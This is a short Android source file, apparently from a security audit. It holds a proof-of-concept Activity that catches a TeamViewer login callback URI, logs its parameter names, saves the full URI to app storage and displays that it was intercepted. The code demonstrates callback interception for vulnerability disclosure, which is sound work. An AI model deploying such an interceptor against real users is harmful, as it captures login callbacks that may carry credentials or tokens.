package com.audit.tvcatch;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import java.io.FileOutputStream;

// Benign PoC: records the received login callback URI to app-private storage and logcat.
public class Catch extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Uri u = getIntent().getData();
        String s = String.valueOf(u);
        Log.i("TVCATCH", "received " + (u == null ? "null" : (u.getScheme() + "://" + u.getHost())) + " params=" + (u == null ? "" : u.getQueryParameterNames()));
        try (FileOutputStream f = openFileOutput("last_callback.txt", MODE_PRIVATE)) { f.write(s.getBytes()); } catch (Exception e) { Log.e("TVCATCH", "write", e); }
        TextView t = new TextView(this);
        t.setText("Intercepted TeamViewer login callback\nparams: " + (u == null ? "" : u.getQueryParameterNames()));
        setContentView(t);
    }
}
